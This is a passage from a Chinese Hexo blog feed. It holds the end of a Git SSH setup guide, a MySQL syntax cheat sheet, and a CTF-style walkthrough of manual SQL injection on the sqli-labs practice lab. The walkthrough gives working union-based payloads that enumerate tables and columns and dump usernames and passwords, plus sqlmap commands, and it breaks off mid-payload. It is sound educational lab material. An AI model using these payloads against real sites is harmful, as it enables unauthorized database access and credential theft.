xxx! You've successfully authenticated, but GitHub does not provide shell access.</code></pre><p>修改之后,需要切换成对应的ssh</p><p><strong>有如下两种解决方法：</strong></p><p>打开.git/config文件</p><pre class="line-numbers language-plain"><code class="language-plain">更改[remote "origin"]项中的url  对应上面配置的host[remote "origin"] url = git@github-wustais:xxx/xxxx.git    //这里不要git@也行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> 或者在Git Bash中修改remote  </p><pre class="line-numbers language-plain"><code class="language-plain">$ git remote rm origin$ git remote add origin git@github-wustais:xxx/xxxx.git        //这里不要git@也行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>验证</p><pre><code>$ git remote -vgithub  github-wustais:xxx/xxx.git (fetch)github  github-wustais:xxx/xxx.git (push)</code></pre><p>这时，使用的ssh就会根据.ssh/onfig文件更改为 id-rsa-ais</p><p>便可以连接上远程仓库<code>github-wustais:xxx/xxx.git</code>，即<code>git@github.com:xxx/xxx.git</code>了。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
          <category> 安装与配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Github </tag>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MYSQL常用基础语法</title>
      <link href="/2021/01/21/2021-1-21-mysql-chang-yong-ji-chu-yu-fa/"/>
      <url>/2021/01/21/2021-1-21-mysql-chang-yong-ji-chu-yu-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL常用基础语法"><a href="#MySQL常用基础语法" class="headerlink" title="MySQL常用基础语法"></a>MySQL常用基础语法</h1><p>Younger_zeng 2018-08-02 17:20:23  <a href="https://blog.csdn.net/qq_36969257/article/details/81364113" target="_blank" rel="noopener">https://blog.csdn.net/qq_36969257/article/details/81364113</a></p><h2 id="MySQL语法"><a href="#MySQL语法" class="headerlink" title="MySQL语法"></a>MySQL语法</h2><p>[TOC]</p><pre><code>MySQL语法        启动和关闭        分类：        数据类型        DDL        DML        DCL        DQL                条件查询                模糊查询                字段控制查询                排序                聚合函数                分组(GROUP BY)查询                HAVING子句                LIMIT        完整性约束        MySQL数据库备份与还原        多表查询</code></pre><h3 id="启动和关闭"><a href="#启动和关闭" class="headerlink" title="启动和关闭"></a>启动和关闭</h3><pre class="line-numbers language-mysql"><code class="language-mysql">启动：net start mysql;关闭：net stop mysql;登录：mysql -u root -p 123 -h localhost；退出：quit;1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h3><ul><li>DDL（Data Definition Language）：数据定义语言，用来定义数据库对象：库、表、列等； </li><li>DML（Data Manipulation Language）:数据操作语言，用来定义数据库记录（数据）；</li><li>DCL（Data Control Language）：数据控制语言，用来定义访问权限和安全级别；</li><li>DQL（Data Query Language）：数据查询语言，用来查询记录（数据）。</li></ul><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><h3 id="DDL"><a href="#DDL" class="headerlink" title="DDL"></a>DDL</h3><pre class="line-numbers language-mysql"><code class="language-mysql">查看所有数据库名称：SHOW DATABASES；切换数据库：USE mydb1;创建数据库：CREATE DATABASE [IF NOT EXISTS] mydb1；删除数据库：DROP DATABASE [IF EXISTS] mydb1；修改数据库编码：ALTER DATABASE mydb1 CHARACTER SET utf812345# 创建表CREATE TABLE stu(    sid     CHAR(6),    sname   VARCHAR(20),    age     INT,    gender  VARCHAR(10) );CREATE TABLE emp(    eid     CHAR(6),    ename   VARCHAR(50),    age     INT,    gender  VARCHAR(6),    birthday    DATE,    hiredate    DATE,    salary  DECIMAL(7,2),    resume  VARCHAR(1000));123456789101112131415161718查看当前数据库中所有表名称：SHOW TABLES；查看指定表的创建语句：SHOW CREATE TABLE emp;查看表结构：DESC emp;删除表：DROP TABLE emp;修改表：# 1.修改之添加列：给stu表添加classname列：    ALTER TABLE stu ADD (classname varchar(100));# 2.修改之修改列类型：修改stu表的gender列类型为CHAR(2)：    ALTER TABLE stu MODIFY gender CHAR(2);# 3.修改之修改列名：修改stu表的gender列名为sex：    ALTER TABLE stu change gender sex CHAR(2);# 4.修改之删除列：删除stu表的classname列：    ALTER TABLE stu DROP classname;# 5.修改之修改表名称：修改stu表名称为student：    ALTER TABLE stu RENAME TO student;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="DML"><a href="#DML" class="headerlink" title="DML"></a>DML</h3><pre class="line-numbers language-mysql"><code class="language-mysql"># 插入数据INSERT INTO stu(sid, sname) VALUES('s_1001', 'zhangSan');INSERT INTO stu VALUES('s_1002', 'liSi', 32, 'female');# 修改数据UPDATE stu SET sname=’liSi’, age=’20’ WHERE age>50 AND gender=’male’;# 删除数据DELETE FROM stu WHERE sname=’chenQi’ OR age > 30;DELETE FROM stu; # truncate 是先DROP TABLE，再CREATE TABLE。而且TRUNCATE删除的记录是无  法回滚的，但DELETE删除的记录是可以回滚的TRUNCATE TABLE stu;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="DCL"><a href="#DCL" class="headerlink" title="DCL"></a>DCL</h3><pre class="line-numbers language-mysql"><code class="language-mysql"># 创建用户: CREATE USER 用户名@地址 IDENTIFIED BY '密码';CREATE USER user1@localhost IDENTIFIED BY ‘123’; CREATE USER user2@’%’ IDENTIFIED BY ‘123’; # 给用户授权: GRANT 权限1, … , 权限n ON 数据库.* TO 用户名GRANT CREATE,ALTER,DROP,INSERT,UPDATE,DELETE,SELECT ON mydb1.* TO user1@localhost;GRANT ALL ON mydb1.* TO user2@localhost;# 撤销授权: REVOKE权限1, … , 权限n ON 数据库.* FORM 用户名REVOKE CREATE,ALTER,DROP ON mydb1.* FROM user1@localhost;# 查看用户权限:SHOW GRANTS FOR 用户名SHOW GRANTS FOR user1@localhost;# 删除用户:DROP USER 用户名DROP USER user1@localhost;# 修改用户密码USE mysql;UPDATE USER SET PASSWORD=PASSWORD(‘密码’) WHERE User=’用户名’ and Host=’IP’;FLUSH PRIVILEGES;#------------------UPDATE USER SET PASSWORD=PASSWORD('1234') WHERE User='user2' and Host=’localhost’;FLUSH PRIVILEGES;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="DQL"><a href="#DQL" class="headerlink" title="DQL"></a>DQL</h3><pre class="line-numbers language-mysql"><code class="language-mysql">语法：SELECT selection_list /*要查询的列名称*/  FROM table_list /*要查询的表名称*/  WHERE condition /*行条件*/  GROUP BY grouping_columns /*对结果分组*/  HAVING condition /*分组后的行条件*/  ORDER BY sorting_columns /*对结果分组*/  LIMIT offset_start, row_count /*结果限定*/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h5><ul><li>=、!=、&lt;&gt;、&lt;、&lt;=、&gt;、&gt;=；</li><li>BETWEEN…AND；</li><li>IN(set)；</li><li>IS NULL；</li><li>AND；</li><li>OR；</li><li>NOT；</li></ul><pre class="line-numbers language-mysql"><code class="language-mysql">SELECT * FROM stu WHERE sid IN ('S_1001','S_1002','S_1003');SELECT * FROM stuWHERE sname IS NOT NULL;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="模糊查询"><a href="#模糊查询" class="headerlink" title="模糊查询"></a>模糊查询</h5><ul><li>“<em>_”:匹配任意一个字母，5个“</em>”表示5个任意字母 </li><li>“%”:匹配0~n个任何字母 “</li></ul><pre class="line-numbers language-mysql"><code class="language-mysql"># 查询姓名中第2个字母为“i”的学生记录SELECT * FROM stuWHERE sname LIKE '_i%';<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="字段控制查询"><a href="#字段控制查询" class="headerlink" title="字段控制查询"></a>字段控制查询</h5><ul><li><p>去除重复记录 :distinct</p><p><code>SELECT DISTINCT sal FROM emp;</code></p></li><li><p>给列名添加别名 </p><p><code>SELECT *, sal+IFNULL(comm,0) AS total FROM emp;</code></p></li></ul><h5 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h5><pre class="line-numbers language-mysql"><code class="language-mysql">SELECT * FROM empORDER BY sal DESC,empno ASC;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h5><ul><li>COUNT()：统计指定列不为NULL的记录行数；</li><li>MAX()：计算指定列的最大值，是字符串类型，那么使用字符串排序运算；</li><li>MIN()：计算指定列的最小值，是字符串类型，那么使用字符串排序运算；</li><li>SUM()：计算指定列的数值和，不是数值类型，计算结果为0；</li><li>AVG()：计算指定列的平均值，不是数值类型，那么计算结果为0；</li></ul><h5 id="分组-GROUP-BY-查询"><a href="#分组-GROUP-BY-查询" class="headerlink" title="分组(GROUP BY)查询"></a>分组(GROUP BY)查询</h5><pre class="line-numbers language-mysql"><code class="language-mysql">SELECT deptno,COUNT(*)FROM empWHERE sal>1500GROUP BY deptno;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="HAVING子句"><a href="#HAVING子句" class="headerlink" title="HAVING子句"></a>HAVING子句</h5><pre class="line-numbers language-mysql"><code class="language-mysql">SELECT deptno, SUM(sal) FROM empGROUP BY deptnoHAVING SUM(sal) > 9000;#注：WHERE是对分组前记录的条件，如果某行记录没有满足WHERE子句的条件，那么这行记录不会参加分组；而HAVING是对分组后数据的约束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="LIMIT"><a href="#LIMIT" class="headerlink" title="LIMIT"></a>LIMIT</h5><blockquote><p>limit 起始行 , 查询行数 //起始行从0开始，为开区间</p></blockquote><pre class="line-numbers language-mysql"><code class="language-mysql"># 查询从第四行开始的10行记录SELECT * FROM emp LIMIT 3, 10;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="完整性约束"><a href="#完整性约束" class="headerlink" title="完整性约束"></a>完整性约束</h3><ol><li><p>主键 ：primary key</p><ul><li><p>创建表：定义列时指定主键</p></li><li><p>创建表：定义列之后独立指定主键</p></li><li><p>修改表时指定主键</p><p><code>ALTER TABLE stu ADD PRIMARY KEY(sid);</code></p></li><li><p>删除主键 </p><p><code>ALTER TABLE stu DROP PRIMARY KEY;</code></p></li></ul></li><li><p>主键自增长 ：auto_increment（主键必须是整型才可以自增长） </p><ul><li><p>创建表时设置主键自增长</p><pre class="line-numbers language-mysql"><code class="language-mysql">CREATE TABLE stu(    sid INT PRIMARY KEY AUTO_INCREMENT,    sname   VARCHAR(20),    age     INT,    gender  VARCHAR(10));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>修改表时设置主键自增长 </p><p><code>ALTER TABLE stu CHANGE sid sid INT AUTO_INCREMENT;</code></p></li><li><p>修改表时删除主键自增长</p><p><code>ALTER TABLE stu CHANGE sid sid INT;</code></p></li></ul></li><li><p>非空：NOT NULL</p><blockquote><p>字段设为非空后，插入记录时必须给值</p></blockquote></li><li><p>唯一：UNIQUE</p><blockquote><p>字段指定唯一约束后，字段的值必须是唯一的 </p></blockquote></li><li><p>外键</p><blockquote><p>外键是另一张表的主键 ！！</p><p>外键就是用来约束这一列的值必须是另一张表的主键值！!</p></blockquote><pre class="line-numbers language-mysql"><code class="language-mysql"># 创建表时设置外键CREATE TABLE t_section(    sid INT PRIMARY KEY AUTO_INCREMENT,    sname   VARCHAR(30),    u_id    INT,    CONSTRAINT fk_t_user FOREIGN KEY(u_id) REFERENCES t_user(uid));# 修改表时设置外键ALTER TABLE t_sessionADD CONSTRAINT fk_t_userFOREIGN KEY(u_id)REFERENCES t_user(uid);# 修改表时删除外键ALTER TABLE t_sectionDROP FOREIGN KEY fk_t_user;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="MySQL数据库备份与还原"><a href="#MySQL数据库备份与还原" class="headerlink" title="MySQL数据库备份与还原"></a>MySQL数据库备份与还原</h3><ol><li><p>生成SQL脚本 (备份)</p><blockquote><p>脚本文本中只包含数据库的内容，而不会存在创建数据库的语句!</p><p>在未登录mysql状态下：</p><p>mysqldump –u 用户名 –p 密码 数据库名&gt;生成的脚本文件路径<code>mysqldump -uroot -p123456 javaclass&gt;E:\javaclass.sql</code></p></blockquote></li><li><p>执行SQL脚本 </p><blockquote><p>执行SQL脚本需要登录mysql，进入指定数据库，执行SQL脚本！<code>SOURCE E:\javaclass.sql</code></p><p>无需登录mysql</p><p>mysql –u用户名 –p密码 数据库&lt;要执行脚本文件路径 :</p><p><code>mysql -uroot -p123456 javaclass&lt;E:\javaclass.sql</code></p></blockquote></li></ol><h3 id="多表查询"><a href="#多表查询" class="headerlink" title="多表查询"></a>多表查询</h3><ul><li>合并结果集</li><li>连接查询 <ol><li>内连接</li><li>外连接 <ol><li>左外连接</li><li>右外连接</li><li>全外连接（MYSQL不支持）</li></ol></li><li>自然连接</li></ol></li><li>子查询</li></ul><hr><p><strong>合并结果集</strong></p><ul><li>UNION：去除重复记录 <code>SELECT * FROM t1 UNION SELECT * FROM t2；</code> </li><li>UNION ALL:不去除重复记录<code>SELECT * FROM t1 UNION ALL SELECT * FROM t2;</code></li></ul><p><strong>连接查询</strong></p><p><em>内连接</em>：</p><pre class="line-numbers language-mysql"><code class="language-mysql"># 方言版SELECT e.ename,e.sal,e.comm,d.dname FROM emp AS e,dept AS dWHERE e.deptno=d.deptno;# 标准版SELECT * FROM emp e INNER JOIN dept d ON e.deptno=d.deptno;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em>左连接</em>：</p><pre class="line-numbers language-mysql"><code class="language-mysql">SELECT * FROM emp e LEFT OUTER JOIN dept d ON e.deptno=d.deptno;123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><em>右连接</em>:</p><pre class="line-numbers language-mysql"><code class="language-mysql">SELECT * FROM emp e RIGHT OUTER JOIN dept d ON e.deptno=d.deptno;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><em>自然连接</em>:</p><pre class="line-numbers language-mysql"><code class="language-mysql">SELECT * FROM emp NATURAL JOIN dept;SELECT * FROM emp NATURAL LEFT JOIN dept;SELECT * FROM emp NATURAL RIGHT JOIN dept;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>子查询</strong></p><blockquote><p>嵌套查询，即SELECT中包含SELECT，如果一条语句中存在两个，或两个以上SELECT，那么就是子查询语句了。 </p><p>子查询出现的位置：</p><ul><li>where后，作为条件的一部分 </li><li>from后，作为被查询的一条表</li></ul></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web，mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf手工SQL注入</title>
      <link href="/2021/01/16/2021-1-16-sql-shou-gong-zhu-ru/"/>
      <url>/2021/01/16/2021-1-16-sql-shou-gong-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>SQL注入是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令的 web攻击方式。权限大时可写入webshell，后门，系统命令执行，权限小时可通过注入获得系统敏感信息（管理员账号密码，重要数据等），修改数据库信息。</p><blockquote><p>按照注入点类型来分类</p></blockquote><h3 id="（1）数字型注入点"><a href="#（1）数字型注入点" class="headerlink" title="（1）数字型注入点"></a>（1）数字型注入点</h3><p>许多网页链接有类似的结构 <a href="http://xxx.com/users.php?id=1" target="_blank" rel="noopener">http://xxx.com/users.php?id=1</a> 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。</p><p>这一类的 SQL 语句原型大概为 <code>select * from 表名 where id=1</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where id=1 and 1=1</code></p><h3 id="（2）字符型注入点"><a href="#（2）字符型注入点" class="headerlink" title="（2）字符型注入点"></a>（2）字符型注入点</h3><p>网页链接有类似的结构 <a href="http://xxx.com/users.php?name=admin" target="_blank" rel="noopener">http://xxx.com/users.php?name=admin</a> 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 <code>select * from 表名 where name='admin'</code> 值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。</p><p>若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where name='admin' and 1=1 '</code> 我们需要将这些烦人的引号给处理掉。</p><h3 id="（3）搜索型注入点"><a href="#（3）搜索型注入点" class="headerlink" title="（3）搜索型注入点"></a>（3）搜索型注入点</h3><p>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 <code>"keyword=关键字"</code> 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。</p><p>此类注入点提交的 SQL 语句，其原形大致为：<code>select * from 表名 where 字段 like '%关键字%'</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where 字段 like '%测试%' and '%1%'='%1%'</code></p><blockquote><p>按照数据提交的方式来分类</p></blockquote><h3 id="（1）GET-注入"><a href="#（1）GET-注入" class="headerlink" title="（1）GET 注入"></a>（1）GET 注入</h3><p>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<a href="http://xxx.com/index.php?id=1" target="_blank" rel="noopener">http://xxx.com/index.php?id=1</a> , id 是注入点。</p><h3 id="（2）POST-注入"><a href="#（2）POST-注入" class="headerlink" title="（2）POST 注入"></a>（2）POST 注入</h3><p>使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。</p><h3 id="（3）Cookie-注入"><a href="#（3）Cookie-注入" class="headerlink" title="（3）Cookie 注入"></a>（3）Cookie 注入</h3><p>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。</p><h3 id="（4）HTTP-头部注入"><a href="#（4）HTTP-头部注入" class="headerlink" title="（4）HTTP 头部注入"></a>（4）HTTP 头部注入</h3><p>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p><blockquote><p>按照执行效果来分类</p></blockquote><h3 id="（1）基于布尔的盲注"><a href="#（1）基于布尔的盲注" class="headerlink" title="（1）基于布尔的盲注"></a>（1）基于布尔的盲注</h3><p>即可以根据返回页面判断条件真假的注入。</p><h3 id="（2）基于时间的盲注"><a href="#（2）基于时间的盲注" class="headerlink" title="（2）基于时间的盲注"></a>（2）基于时间的盲注</h3><p>即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p><h3 id="（3）基于报错注入"><a href="#（3）基于报错注入" class="headerlink" title="（3）基于报错注入"></a>（3）基于报错注入</h3><p>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p><ol><li>单引号</li><li>双引号</li><li>基于数字型注入</li></ol><h3 id="（4）联合查询注入"><a href="#（4）联合查询注入" class="headerlink" title="（4）联合查询注入"></a>（4）联合查询注入</h3><p>可以使用union的情况下的注入。</p><h3 id="（5）堆查询注入"><a href="#（5）堆查询注入" class="headerlink" title="（5）堆查询注入"></a>（5）堆查询注入</h3><p>可以同时执行多条语句的执行时的注入。</p><h3 id="（6）宽字节注入"><a href="#（6）宽字节注入" class="headerlink" title="（6）宽字节注入"></a>（6）宽字节注入</h3><p>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）</p><h3 id="基于sqli-labs的实践操作"><a href="#基于sqli-labs的实践操作" class="headerlink" title="基于sqli-labs的实践操作"></a>基于sqli-labs的实践操作</h3><h4 id="1-基于报错的GET-sql注入"><a href="#1-基于报错的GET-sql注入" class="headerlink" title="1.基于报错的GET sql注入"></a>1.基于报错的GET sql注入</h4><h5 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h5><p><img src="/img/less-1.png" alt=""></p><p>提示说输入一个数字作为ID的值</p><p>那么先在url输入?id=1</p><p><img src="/img/less-1%E8%BE%93%E5%85%A5id=1.png" alt=""></p><p>显示查询成功，返回了用户Dumb</p><p>然后尝试使其报错，输入 ?id=1’</p><p><img src="/img/less-1%E8%BE%93%E5%85%A5id-1'.png" alt=""></p><p>报错了，显示为 ‘’1’’ LIMIT 0,1’</p><p>有了这个，我们就可以揣测一下网站后端的sql请求语句了</p><p>首先，这个报错语句是被 ‘ ‘ 单引号闭合的，于是将其拆分 ‘   ‘1’’ LIMIT 0,1   ‘，可知报错的段落是 ‘1’’ LIMIT 0,1,由于我们输入的id值是1’</p><p>,所以再拆分一下为’   1’   ‘ LIMIT 0,1</p><p>由此可以看出后台语句大致是 </p><pre class="line-numbers language-mysql"><code class="language-mysql">"SELECT username,password FROM user WHERE id = '$id' limit 0,1 "<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> id被单引号包裹，这是字符型注入点</p><h5 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h5><p><img src="/img/less-2.png" alt=""></p><p>流程与上面差不多</p><p>不同的是，这次输入id=1’后报错为 ‘’ LIMIT 0,1’</p><p>还是用和上面一样的方法拆分这段 ，’     ‘ LIMIT 0,1      ‘  –&gt;’ LIMIT 0,1</p><p>可以看到limit前面多了一个单引号，而我们正是在1后面多加了一个单引号，说明这个单引号并没有被id读进去</p><p>由此可以看出后台语句大致是 </p><pre class="line-numbers language-mysql"><code class="language-mysql">"SELECT username,password FROM user WHERE id =$id limit 0,1 "<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>id没有被单引号包裹，这是一个数字型注入点</p><h5 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h5><p><img src="/img/less-3.png" alt=""></p><p>这次的报错是 ‘’1’’) LIMIT 0,1’</p><p>拆分 ‘   ‘1’’) LIMIT 0,1   ‘–&gt;’1’’) LIMIT 0,1–&gt;’   <em>1’</em>   ‘) LIMIT 0,1</p><p>显然，后台语句是</p><pre class="line-numbers language-mysql"><code class="language-mysql">"SELECT username,password FROM user WHERE id = ('$id') limit 0,1 "<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但上面的语句只不过都是猜测，怎么验证呢，只有再构造语句来验证了</p><p>比如上面这个less-3</p><p>我们试着把输入改为 id=1’) –+或id=1’) –%20</p><p><img src="/img/--+.png" alt=""></p><p>![](/img/– .png)</p><p>都成功了，这就说明后台语句和我们想的八九不离十了</p><h5 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h5><p>这次除了使用注释符，用上面的方法怎么输入页面都不报错，而题目说了 Double quotes,显然这次id是被””包裹了，输入的id值都会被当作字符串，加单引号括号都没用。</p><p>那就使用\来制造报错，输入 id=1\</p><p>返回报错 ‘“1\“) LIMIT 0,1’–&gt;”1\“) LIMIT 0,1</p><p>\将后面的双引号消掉了，于是这一段语句就闭合不了了，遂报错</p><p>合理推测：</p><pre class="line-numbers language-mysql"><code class="language-mysql">"SELECT username,password FROM user WHERE id = ("id") limit 0,1 "<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>验证：</p><p><img src="/img/less-4.png" alt=""></p><p>这样4种不同的注入点的后台语句就通过报错大致的试出来了</p><p>之后就可以根据注入点类型通过order by语句测试字段数，通过union语句爆出表名，字段名等</p><p>例如less-1(字符型) 就可以输入?id=1’ order by 1[,2,3,4… ] –+测出该表中column的数量，order by最多能够到几，表中就有几段column，这对之后union注入有大用</p><p>less-1能够order by到3，也就是它有3个字段，于是接下来union注入</p><p>我们要构造的语句是SELECT [username,password] FROM user WHERE id = ‘0’ union select 1,2,3 –+ limit 0,1</p><p>所以输入（如果利用hackerbar或max hackerbar工具会方便很多）：id=0’ union select 1,2,3 –+</p><p>这里构造id=0的目的就是让这一段请求报错，这样页面上显示的才是union联合语句查找出来的结果</p><p>效果</p><p><img src="/img/union%E6%B3%A8%E5%85%A5.png" alt=""></p><p>可以看到，我们select 1,2,3 ，它回显了2，3，说明返回的是三个字段中的第二个和第三个，这对接下来爆表和爆库有用</p><p>于是接下来注入 id=0’ union select 1,user(),database() –+</p><p><img src="/img/union%E7%88%86%E5%BA%93.png" alt=""></p><p>爆出了用户名和使用的数据库名</p><p>然后还可以用version()函数爆出数据库版本，这样就可以针对性的进行一些注入</p><p>例如：</p><p>爆表：</p><pre class="line-numbers language-mysql"><code class="language-mysql">id=0' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database() --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​            information_schema是储存了所有数据库信息的库，tables储存了所有表信息的表</p><p><img src="/img/union%E7%88%86%E8%A1%A8.png" alt=""></p><p>看到了最后一个表是’users’,可用于下一步爆字段</p><p>爆字段：</p><pre class="line-numbers language-mysql"><code class="language-mysql">id=0' union select 1,group_concat(column_name),database() from information_schema.columns where table_name='users' --+        //记得最后这个表名要加单引号，不然没用<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/img/union%E7%88%86%E5%AD%97%E6%AE%B5.png" alt=""></p><p>爆出来了users表中的所有字段，最重要的user,password等全出来了，接下来就可以union查询出它们的值了</p><pre class="line-numbers language-mysql"><code class="language-mysql">id=0' union select 1,group_concat(username,0x3a,password),3 from [security.]users --+        //有时候要在表名前面加上数据库名，不然也出不来,即 这个环境下的security.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/img/union%E7%88%86%E5%87%BA%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.png" alt=""></p><p>好家伙，借助group_concat()方法，该数据库所有的账号密码都以“账号：密码”的格式爆出来了</p><h2 id="利用SQLmap工具进行sql注入"><a href="#利用SQLmap工具进行sql注入" class="headerlink" title="利用SQLmap工具进行sql注入"></a>利用SQLmap工具进行sql注入</h2><p>进入SQLmap工具目录打开命令行，输入命令</p><pre class="line-numbers language-bash"><code class="language-bash">py sqlmap.py -u http://xxx.com/?id<span class="token operator">=</span>1 --dbs --batch        //输入点为id参数 --dbs参数用于探测数据库，--batch参数用于自动执行默认选项（省的我们在探测过程中一直按Y）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果只有一个注入点，可以不用在url两边加上双引号，如果有两个注入点，则需要将url用双引号括起来</p><pre class="line-numbers language-bash"><code class="language-bash">py sqlmap.py -u <span class="token string">"http://xxx.com/?id=1&amp;digree=high"</span> --dbs --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果需要的数据就在本数据库里，则可以省去上面这一步，直接进行接下来的爆表，爆字段的操作</p><pre class="line-numbers language-bash"><code class="language-bash">py sqlmap.py -u http://xxx.com/?id<span class="token operator">=</span>1 --tables --batch        //爆表假如爆出表名‘flag’<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">py sqlmap.py -u http://xxx.com/?id<span class="token operator">=</span>1 -T flag --columns --batch        //爆字段假如爆出字段‘flag’<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">py sqlmap.py -u http://xxx.com/?id<span class="token operator">=</span>1 -T flag -C flag --dump --batch        //爆出数据到这里就可以拿到我们想要的字段里的数据了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="布尔型盲注"><a href="#布尔型盲注" class="headerlink" title="布尔型盲注"></a>布尔型盲注</h3><p>采用以下语句拆（猜）解字符串</p><p>猜解数据库名字长度</p><pre class="line-numbers language-mysql"><code class="language-mysql">?id 